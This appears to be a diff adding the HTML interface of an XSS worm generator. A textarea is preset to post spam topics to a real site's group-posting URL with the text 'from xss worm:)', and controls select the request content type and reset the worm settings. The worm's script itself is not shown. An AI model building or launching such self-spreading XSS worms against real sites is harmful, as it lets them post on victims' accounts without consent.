@@ -1,0 +1,14 @@
+<div id="worm_left">
+	<textarea id="worm_codz">src="http://www.yeeyan.com/groups/newTopic/"
+title="xss"
+content="from xss worm:)"</textarea>
+</div>
+<div id="worm_right">
+	<select style="width:262px" onchange="worm.setWorm(this.options[selectedIndex].value)" name="worm_set" id="worm_set">
+		<option value="">Content-Type</option>
+		<option value="1">multipart/form-data</option>
+		<option value="2">application/x-www-form-urlencoded</option>
+	</select>
+	<br /><br />
+	<input type="button" id="worm_reset" value="reset" onclick="worm.resetWorm()" />
+</div>
